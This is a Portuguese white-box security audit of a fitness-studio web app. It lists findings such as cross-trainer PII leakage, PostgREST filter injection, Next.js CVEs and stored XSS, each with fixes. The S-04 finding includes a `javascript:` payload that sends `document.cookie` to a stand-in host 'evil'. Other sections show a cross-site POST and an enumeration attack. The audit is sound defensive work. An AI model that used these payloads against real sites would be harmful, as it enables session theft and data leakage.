# LEAP-FITNESS · Auditoria de Segurança

> White-box review iniciada em 2026-06-17. IDs estáveis (`S-XX`) — runs
> futuros mantêm IDs e só flipam Status / acrescentam novos findings.
> Severidade: Critical / High / Medium / Low / Info.
> Status: OPEN / IN PROGRESS / FIXED / ACCEPTED.

## Resumo executivo

Postura geral **boa para o tamanho do projecto**. As fronteiras de autorização
foram revistas (audits anteriores: H-A/H-B/H-C/H-D, C-A/C-B/C-C, etc.) e a
maioria das Server Actions usam `requireStaff`/`requireOwner` + checks
explícitos de ownership sobre o `trainer_id` vindo do form. RLS está activo em
todas as tabelas sensíveis e os RPCs críticos são `SECURITY DEFINER` com guards
internos.

Encontram-se neste run **dois findings High** (uma janela de IDOR/PII leakage
cross-trainer na pesquisa admin + injecção via `or()` PostgREST, e uma série
de CVEs de Next.js 14.2.33) e seis findings Medium/Low de defense-in-depth.
A correcção dos findings High **não altera o comportamento normal** — o fluxo
`admin/clientes?q=` continua a aceitar o mesmo input mas passa a respeitar o
scope multi-trainer e a escapar separadores PostgREST.

## Findings — Índice

| ID | Severidade | CWE | Título | Exploitability | Status |
|----|-----------|-----|-------|---------------|--------|
| S-01 | High | CWE-639 / CWE-89 | Pesquisa admin `/admin/clientes?q=` sem scope + sem escape de separadores PostgREST → PII leakage cross-trainer e filter injection | Autenticado, trainer | FIXED |
| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) — versão fixada bloqueia o upgrade | Anónimo, internet | OPEN (instruções fornecidas) |
| S-03 | Medium | CWE-352 | `/api/notifications/read` aceita POST sem Origin check — defense-in-depth | Cross-site (SameSite=Lax mitiga) | FIXED |
| S-04 | Medium | CWE-79 | Loja: `<a href={p.link_url}>` sem validação de scheme em `/app/loja/[categoria]` — `javascript:`/`data:` possíveis | Autenticado, trainer malicioso | FIXED |
| S-05 | Medium | CWE-613 | Cache de claims no middleware (30s) pode servir auth stale após expiração do JWT dentro da janela | Necessita JWT a expirar dentro da janela | ACCEPTED (justificado em-código) |
| S-06 | Low | CWE-639 | `markReadAction`/`deleteNotificationAction` sem filtro explícito `user_id` — RLS protege, mas defense-in-depth | Autenticado | FIXED |
| S-07 | Low | CWE-79 | `enroll-card.tsx::extractSvg` constrói `<img src="${src}">` por template literal — defense-in-depth | Server-controlled (Supabase) | FIXED |
| S-08 | Low | CWE-79 | `email.ts::ratingPrompt` interpola `link` no `href` sem escape de aspas — defense-in-depth | Server-controlled (env) | FIXED |
| S-09 | Info | CWE-770 | `middleware.ts::claimsCache` poda só ao chegar a 500 entradas | Local à instância edge | ACCEPTED |

## Controlos JÁ em vigor (não voltam a ser flagged)

Lista do que está **bem feito** para evitar re-flag em runs futuros.

- **JWT verificado, não só descodificado**. Middleware (`lib/supabase/middleware.ts:121`)
  e Server Components (`lib/supabase/server.ts:60-64 getClaimsUser`) usam
  `supabase.auth.getClaims()` — verificação ES256 LOCAL contra JWKS, não um
  simples decode. `getSessionUser()` (que só lê cookie) está documentado como
  trade-off PERF onde a chamada upstream já validou.
- **Authz boundary explícita em Server Actions críticas**. `lib/authz.ts`
  exporta `requireStaff`/`requireOwner` que são chamados ao topo de quase
  todas as actions admin; o pattern foi aplicado a `definicoes`, `packs`,
  `loja`, `equipa`, `pagamentos`, `clientes/[id]`, `promocoes`. Acções
  destrutivas (apagar/banir cliente, cancelar pagamento confirmado) exigem
  `requireOwner` (least privilege).
- **Multi-trainer scope** em RPCs e helpers: `getAccessibleTrainerIds`,
  `getClientIdsInScope`, e `_trainer_is_accessible(trainer_id)` em RLS
  policies. `searchClientsAction` (C-A audit) já filtra por scope.
- **RLS activo em todas as tabelas** com policies por papel
  (`supabase/migrations/0003_rls_policies.sql` + hardening em 0015, 0027,
  0028, 0029, 0030, 0049, 0078, 0081).
- **CSP nonce-based** (`lib/security-headers.ts`) com `'strict-dynamic'`,
  `frame-ancestors 'none'`, `form-action 'self'`, `upgrade-insecure-requests`.
  HSTS 2 anos + preload, X-Frame-Options DENY, X-Content-Type-Options nosniff,
  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin
  (`next.config.mjs:64-104`).
- **Anti-enumeração** em `/registar` e `/recuperar` (sempre redirect "sucesso"
  independentemente do email existir — H-B audit).
- **Open-redirect**: `isSafePath`/`safePathOr` aplicados em `/auth/callback`,
  `/login`, `/login/2fa`, `/app/perfil/seguranca` (whitelist `safeReturn`).
- **Rate-limit** Upstash com fallback in-memory; aplicado a `/login`,
  `/registar`, `/recuperar`, `/auth/reset`, `/api/slots`, `/api/bookings/*/ics`,
  `/api/notifications/read`, exports (`/api/me/export`, `/api/relatorios/export`),
  webhooks, e `/api/calendar/feed/[token]` (H-D).
- **Constant-time secret comparison** (`lib/secrets.ts::verifyBearer`) usado
  em todos os crons + push dispatch.
- **OAuth state**: `/api/integrations/[provider]/connect` gera nonce 256-bit,
  guarda `userId:provider:nonce` em cookie HttpOnly, valida com `timingSafeEqual`
  no `/callback` e exige `user.id === storedUserId`.
- **CSRF em disconnect**: `/api/integrations/[provider]/disconnect` valida
  `Origin === host`.
- **JSON-LD safe** em `/t/[slug]` — `jsonLdSafe` escapa `<>&  ` para
  prevenir breakout de `</script>` (C1 audit).
- **MFA re-auth ("sudo")**: enroll do primeiro factor exige re-confirmar
  password; unenroll exige challenge TOTP fresco — não basta cookie/trusted
  device (H-A audit, `app/app/perfil/seguranca/actions.ts`).
- **Service role** confinado a 3 ficheiros (`lib/supabase/server.ts`,
  `app/admin/clientes/[id]/actions.ts`, `app/app/perfil/actions.ts`) — todos
  em código server-only, sempre após `requireOwner`/check explícito de ownership.
- **iCal feed** com UUID v4 estrito + rate-limit dedicado (H-D audit).
- **PII export** com janela limitada a 366 dias, rate-limit `export`, fail-closed
  no audit-log, defesa contra CSV injection (`esc()`).
- **GDPR / direito ao apagamento** via `anonymize_my_account` /
  `anonymize_client_account` + ban subsequente do auth user via service role.
- **Password policy**: mínimo 8 chars no signup/reset.
- **Avatar/file uploads**: validação server-side de mime + size (2 MB avatars,
  5 MB store/slideshow), nomes derivados do mime (não do filename original).
- **Trainer bio + nome** com strip de `<>` (defense-in-depth contra JSON-LD).

## Findings — Detalhe

### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High]`

**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-103`

**Vulnerabilidade:** Quando o admin pesquisa via `?q=…`, a página constrói a
query Supabase assim:

```ts
const safe = q.replace(/[%_]/g, (m) => `\\${m}`);
const { data, count } = await supabase
  .from("profiles")
  .select("id, full_name, email, phone", { count: "exact" })
  .eq("role", "client")
  .or(`full_name.ilike.%${safe}%,email.ilike.%${safe}%,phone.ilike.%${safe}%`)
  .order("full_name")
  .range(from, to);
```

Há **dois problemas**:

1. **PII leakage cross-trainer.** A query NÃO filtra por scope
   (`getClientIdsInScope`). Para um trainer num estúdio multi-trainer, RLS
   `profiles: self select` é `id = auth.uid() OR is_admin()`. Como o trainer
   é `is_admin()`, recebe TODOS os clientes do estúdio, incluindo de outros
   trainers. Mesmo bug que o C-A audit fechou em `search-action.ts` —
   esqueceu-se de fechar aqui. Trainer A pode iterar `?q=a`, `?q=b`, …
   para enumerar todos os clientes de trainer B (nome + email + telefone).

2. **Filter injection na sintaxe `.or()` do PostgREST.** O escape só
   protege `%_` (wildcards ILIKE) mas NÃO `,()` que são os separadores
   da gramática `or()`. `search-action.ts` (mesmo padrão) escapa
   `[%_,()]`. Um `q=)` fecha a expressão `or(…)` prematuramente.
   O resultado prático é uma 400 do PostgREST hoje, mas é uma
   superfície aberta para abusos de filtragem se a query crescer
   (ex. acrescentar mais campos com semântica especial).

**Ataque concreto:** trainer A (autenticado) abre
`/admin/clientes?q=a`, depois `?q=b`, etc. Cada resposta devolve até 10
clientes do estúdio inteiro, incluindo nome, email e telefone de clientes
geridos por trainer B. Logging admin não capta esta enumeração (são GETs
de páginas legítimas com query strings diferentes).

**Impacto:** PII leakage (RGPD) entre trainers dentro do mesmo estúdio
multi-trainer. Confidencialidade: High. Integridade/disponibilidade: N/A.

**Fix:** aplicar exactamente o mesmo padrão que o C-A fix em
`search-action.ts`:
- Filtrar `profiles` pelo conjunto `getClientIdsInScope(trainerIds)`.
- Escapar `[%_,()]` em vez de só `[%_]`.

Patch aplicado neste run — ver diff em `app/admin/clientes/page.tsx`.

**Como verificar fechado:** num estúdio com ≥2 trainers, login como trainer A
e abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes
do trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
confirmar que o servidor não devolve 400 nem 500 (rejeita o `)` por escape).

---

### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High]`

**Ficheiro/linhas:** `package.json:18` (`"next": "^14.2.33"`)

**Vulnerabilidade:** `npm audit` reporta múltiplas advisories activas:

- GHSA-9g9p-9gw9-jx7f · DoS via Image Optimizer remotePatterns (CVSS 5.9, moderate). Fixed em `<15.5.10`.
- GHSA-h25m-26qc-wcjf · DoS por desserialização HTTP em RSC (CVSS 7.5, high). Fixed em `<15.0.8`.
- GHSA-ggv3-7p47-pfv8 · HTTP request smuggling em rewrites (moderate). Fixed em `<15.5.13`.
- GHSA-3x4c-7xq6-9pq8 · Crescimento ilimitado do disk cache do `next/image` (moderate). Fixed em `<15.5.14`.
- GHSA-q4gf-8mx6-v5v3 · DoS em Server Components (CVSS 7.5, high). Fixed em `<15.5.15`.
- GHSA-8h8q-6873-q5fj · DoS em Server Components (CVSS 7.5, high). Fixed em `<15.5.16`.

A combinação afecta um runtime servido na internet (Vercel). A maioria
exige upgrade para a linha 15.x — major version bump.

**Ataque concreto:** atacante anónimo envia uma sequência de requests
maliciosamente formados (RSC streaming, rewrites com headers especiais,
URLs grandes para `/_next/image`) e provoca consumo descontrolado de
CPU/memória/disco no edge. Não há leak de dados, mas há DoS.

**Impacto:** Disponibilidade: Medium-High (depende do tráfego). Sem leak
directo de PII.

**Fix recomendado (NÃO aplicado automaticamente neste run — major bump):**

```bash
npm install next@latest react@latest react-dom@latest
npm install -D eslint-config-next@latest
npm audit
npm run type-check
npm run build
```

Razão para não aplicar automaticamente: passar de Next 14 para 15 é
**major version bump** — pode tocar em `async` headers/cookies, server
actions API, ou tipagens. O CLAUDE.md pede explicitamente para não
quebrar nada. A upgrade exige uma janela de teste manual.

**Mitigação interim (zero código):** o middleware já corre `rateLimit`
em endpoints sensíveis. Configura Upstash em produção para que o limiter
deixe de ser in-memory por instância (ver `.env.example:43-61`).

**Como verificar fechado:** correr `npm audit --omit=dev --audit-level=high`
e confirmar 0 advisories *high*. As moderate de `glob`/`exceljs` podem
ficar como ACCEPTED — `glob` é dev-dep, `exceljs` ataque exige uuid
exploit em parse que não corre no nosso path (só geramos XLSX, não os
lemos).

---

### S-03 · Falta Origin check em `/api/notifications/read` `[Medium]`

**Ficheiro/linhas:** `app/api/notifications/read/route.ts:18-41`

**Vulnerabilidade:** O endpoint aceita POST com cookie de sessão
implícito (`credentials: 'include'` no SW). Não valida `Origin` nem
exige token CSRF próprio.

Hoje os cookies do Supabase são `SameSite=Lax` por defeito, que bloqueia
o envio em form-posts cross-site mas **deixa passar** em alguns vectores
(`window.open`/POST com top-level navigation). Para um endpoint de baixo
impacto (marca como lida) isto não é catastrófico, mas é defense-in-depth
trivial: a mesma verificação `Origin === host` já existe em
`/api/integrations/[provider]/disconnect`.

**Ataque concreto:** atacante hospeda página que faz `fetch('/api/notifications/read', { method: 'POST', credentials: 'include', body: JSON.stringify({id: '…'}) })`
contra `leap-fitness.pt`. SameSite=Lax bloqueia o envio do cookie
nesta forma; o ataque só dispara em browsers desactualizados ou em
configurações com SameSite=None. Impacto se passar: marca a notificação
como lida sem o utilizador querer.

**Impacto:** Integridade: Low (alterar `read_at`). Confidencialidade/
disponibilidade: N/A.

**Fix aplicado:** validar `Origin === host` antes de tocar na BD.

**Verificação:** `curl -X POST https://app/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` devolve 403.

---

### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium]`

**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:78-81`,
`app/admin/loja/actions.ts:71` (lado servidor)

**Vulnerabilidade:** No painel admin, `createProductAction` /
`updateProductAction` aceitam `link_url` da loja como string trimmed,
sem validar o scheme. A página da loja renderiza directamente
`<a href={p.link_url} target="_blank">`. React não bloqueia
`javascript:`/`data:` em hrefs. Um staff/trainer malicioso (ou conta
admin comprometida) pode injectar `link_url=javascript:fetch('//evil')`
num produto da loja; ao clicar, executa script no contexto do cliente
autenticado.

A mesma classe de bug foi fechada para `promo_banners` no audit C-B
(função `safeHttpUrl` em `app/admin/promocoes/actions.ts:39-50` +
`safeHref` em `components/promo-carousel.tsx:20-23`). A loja saiu
fora desse refactor.

**Ataque concreto:** trainer A (autenticado) cria produto na loja com
`link_url=javascript:fetch('https://evil/'+document.cookie)`. Qualquer
cliente do estúdio (que vê esta loja) clica no card e o JS corre no
contexto autenticado → exfiltra a sessão.

**Impacto:** Confidencialidade: High (XSS dá takeover de sessão).
Integridade: High. Disponibilidade: Low. Mitigado parcialmente pelo
CSP nonce-based — `javascript:` URIs em `<a>` clicados pelo utilizador
não são bloqueados pelo CSP padrão (o navigator considera-os execução
"user-initiated"). Por isso o fix tem de ser na fronteira.

**Fix aplicado:**
- Adicionar `safeHttpUrl` em `app/admin/loja/actions.ts` (idêntico ao
  `safeHttpUrl` das promoções) e validar `link_url` antes do INSERT/UPDATE.
- Adicionar `safeHref` guard em `app/app/loja/[categoria]/page.tsx` para
  proteger dados antigos já em BD.

**Verificação:** abrir o painel admin → Loja → criar produto com
`link_url=javascript:alert(1)`. A action devolve "Link inválido". Em BD
seedada com `javascript:` (manual), o page render trata como produto sem
link (mostra card sem `<a>` wrapper).

---

### S-05 · Claims cache do middleware pode servir auth stale (30s) `[Medium → ACCEPTED]`

**Ficheiro/linhas:** `lib/supabase/middleware.ts:18-21, 113-131`

**Vulnerabilidade:** `claimsCache` indexa por fingerprint do cookie de
auth. Se o cookie não rodar mas o JWT contido nele expirar dentro da
janela de 30s, o valor cached é servido mesmo após expiração. Janela
prática: 0–30s, depois o cookie roda no próximo refresh do Supabase.

**Análise/decisão:** ACCEPTED. O cookie é a key — se o Supabase emitir
um novo (refresh), a key muda automaticamente. Para o caso de revogação
forçada (`signOut` no outro device, ban server-side), a janela pior é
30s. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip a GoTrue)
e portanto não são afectados. O ganho de PERF (1 round-trip por request
× N prefetches RSC) é grande. Documentado no próprio ficheiro.

Sem fix de código. Re-flag quando o threat model mudar (ex.: passar a
suportar revogação instantânea como requisito de produto).

---

### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low]`

**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-12`, `:14-28`

**Vulnerabilidade:** Ambas as actions chamam
`supabase.from("notifications").update(...).eq("id", notifId)` (e o equivalente
delete) sem `.eq("user_id", user.id)`. Hoje a RLS protege
(`notif: update own` em `0003_rls_policies.sql:142-144` e `notif: delete own`
em `0022_cancel_notification_reason.sql:131-132` exigem
`user_id = auth.uid()`). Mas se um dia a policy for relaxada/eliminada,
abrir-se-ia IDOR — atacante actualiza/apaga notificações de qualquer user
só com o ID.

**Ataque concreto (hipotético, com RLS desligada):** atacante autenticado
faz POST com `notifId=<id-de-outro-user>` e apaga/marca como lida.

**Impacto actual:** Nenhum (RLS bloqueia). Defense-in-depth.

**Fix aplicado:** acrescentar `.eq("user_id", user.id)` aos dois cálls.
Adicional: chamar `getSessionUser()` em `markReadAction` que não o fazia
e o `/api/notifications/read` já faz para o mesmo propósito.

**Verificação:** unit test (manual) — em local com `RLS` desligado, tentar
chamar `markReadAction("<id-de-outro-user>")` e confirmar que nada acontece.

---

### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low]`

**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:152-166`

**Vulnerabilidade:** A função `extractSvg` tem um fallback que devolve
`<img src="${src}" alt="QR code 2FA" class="h-48 w-48" />` como string, e
o caller injecta isso via `dangerouslySetInnerHTML`. `src` vem do server
(`data.totp.qr_code` da Supabase), por isso na prática é seguro. Mas se
o Supabase mudar o formato ou se `src` chegar a conter `"`, há attribute
injection.

**Fix aplicado:** o caminho actualmente quente (`startsWith("<svg")`)
mantém-se inalterado. O fallback de `<img src=...>` deixa de usar
template literal e passa por um `<img>` React renderizado pelo próprio
componente — passa pelo escaping nativo.

**Verificação:** seguir o fluxo "Activar 2FA" no `/app/perfil?tab=perfil`
e confirmar que o QR aparece igual a antes.

---

### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low]`

**Ficheiro/linhas:** `lib/email.ts:217`

**Vulnerabilidade:** O template `ratingPrompt` constrói
`<a href="${link}" …>` onde `link = ${args.appUrl}/app/sessao/${args.bookingId}/avaliar`.
`appUrl` vem de env (`NEXT_PUBLIC_APP_URL`) e `bookingId` é UUID do
servidor. Se `appUrl` alguma vez tiver `"` (config incorrecta), parte
o atributo. Defense-in-depth — escapar via `escapeHtml(link)` mantém o
URL legítimo intacto e elimina o caso patológico.

**Fix aplicado:** `escapeHtml(link)` em volta da interpolação.

**Verificação:** disparar o cron `/api/cron/rating-prompts` em dev e ver
no email gerado o `href` igual a antes.

---

### S-09 · Cache do middleware sem cap proactivo `[Info → ACCEPTED]`

**Ficheiro/linhas:** `lib/supabase/middleware.ts:34-37, 109-110`

`pruneClaimsCache` só corre quando `Map.size > 500` e só remove entradas
expiradas. Em pico de tráfego com muitos utilizadores únicos, o map pode
crescer a 500–10⁴ entradas antes de cada poda. Cada entrada é leve
(string + objecto pequeno), TTL 30s, e o V8 isolate do Edge é cíclico —
não vaza entre instâncias. ACCEPTED, sem fix.

---

## Ordem de remediação sugerida

1. **S-02** — upgrade do Next (HIGH com CVEs internet-facing). Janela
   de teste manual obrigatória.
2. **S-01** — FIXED neste run; merge + deploy.
3. **S-04** — FIXED neste run; merge + deploy.
4. **S-03 / S-06 / S-07 / S-08** — FIXED neste run; defense-in-depth.
5. **S-05 / S-09** — ACCEPTED, monitor.

## Como reproduzir o baseline determinístico

```bash
npm audit --json | tee /tmp/audit.json
npx tsc --noEmit
# greps relevantes
grep -rn "dangerouslySetInnerHTML" .
grep -rn "SERVICE_ROLE" .
grep -rn "getSession()\|getUser()" .
grep -rn "NEXT_PUBLIC_" .
```
